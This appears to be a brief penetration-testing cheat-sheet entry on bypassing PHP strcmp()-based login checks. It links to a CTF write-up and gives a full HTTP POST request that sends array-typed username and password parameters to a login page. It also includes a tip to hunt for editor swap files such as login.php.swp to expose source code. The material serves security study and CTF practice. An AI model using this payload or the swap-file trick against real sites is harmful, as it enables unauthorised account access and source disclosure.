## strcmp() bypass

https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#strcmp-strcasecmp

```
POST /login.php HTTP/1.1
Host: 10.123.32.1
...
Cookie: PHPSESSID=6avn5uvc0cnm8jc3qbm5numppa
Upgrade-Insecure-Requests: 1

username[]=%22%22&password[]=%22%22
```

## Misc

* Check for swap files (e.g. login.php.swp) of php files we'd like to see the source code for